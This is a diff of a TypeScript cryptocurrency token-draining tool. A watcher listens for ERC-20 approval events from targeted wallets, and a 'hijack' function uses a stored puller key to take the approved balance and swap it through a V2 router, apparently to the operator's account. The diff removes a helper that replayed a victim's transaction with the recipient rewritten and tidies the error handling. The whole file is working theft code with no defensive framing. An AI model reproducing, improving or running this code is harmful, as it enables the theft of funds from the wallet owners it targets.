@@ -56,31 +56,6 @@ async function pickPath(spender: `0x${string}`, token: `0x${string}`, amount: bi
     return null;
 }
 
-function patchRecipient(input: Hex, wallet: `0x${string}`, to: `0x${string}`): Hex | null {
-    const needle = pad(wallet, { size: 32 }).slice(2).toLowerCase();
-    const repl = pad(to, { size: 32 }).slice(2).toLowerCase();
-    const body = input.slice(2).toLowerCase();
-    if (!body.includes(needle)) return null;
-    return ('0x' + body.split(needle).join(repl)) as Hex;
-}
-
-async function replayFromWallet(wallet: `0x${string}`, spender: `0x${string}`, to: `0x${string}`) {
-    try {
-        const block = await pub.getBlock({ blockTag: 'latest', includeTransactions: true });
-        const txs = ((block?.transactions ?? []) as any[]).filter(t =>
-            typeof t !== 'string' && t.from?.toLowerCase() === wallet && t.to?.toLowerCase() === spender
-        );
-        for (const tx of txs.reverse()) {
-            if (!tx.input || tx.input === '0x') continue;
-            const patched = patchRecipient(tx.input as Hex, wallet, to);
-            if (patched) return patched;
-        }
-    } catch {
-        // Ignore transient block read errors
-    }
-    return null;
-}
-
 export async function hijack(t: Target, token: `0x${string}`, spender: `0x${string}`, approved: bigint) {
     const key = `${t.target}:${spender}:${token}`;
     if (seen.has(key) || !t.pullerKey || !t.puller) return;
@@ -101,12 +76,8 @@ export async function hijack(t: Target, token: `0x${string}`, spender: `0x${stri
     if (balance === 0n) return;
     const amount = balance < approved ? balance : approved;
 
-    // Fast path check: Is this spender a valid V2 router supporting our liquidity path?
     const path = await pickPath(spender, token, amount);
-    if (!path) {
-        // Not a recognized V2 router swap approval; skip silently without logging errors
-        return;
-    }
+    if (!path) return;
 
     seen.add(key);
 
@@ -151,9 +122,7 @@ export async function hijack(t: Target, token: `0x${string}`, spender: `0x${stri
         got = await pub.readContract({
             address: outToken, abi: erc20Abi, functionName: 'balanceOf', args: [account.address],
         });
-    } catch {
-        // Retry balance read if needed
-    }
+    } catch {}
 
     if (got === 0n) return;
 
@@ -203,7 +172,15 @@ export async function startHijackWatcher() {
                     if (!l.topics[1] || !l.topics[2] || !l.address) continue;
                     const owner = `0x${l.topics[1].slice(26)}`.toLowerCase() as `0x${string}`;
                     const spender = `0x${l.topics[2].slice(26)}`.toLowerCase() as `0x${string}`;
-                    const amount = BigInt(l.data);
+                    
+                    let amount = 0n;
+                    try {
+                        if (l.data && l.data !== '0x' && l.data.length > 2) {
+                            amount = BigInt(l.data);
+                        }
+                    } catch {
+                        continue;
+                    }
 
                     const targetObj = cache.get(owner);
                     if (targetObj && amount > 0n) {
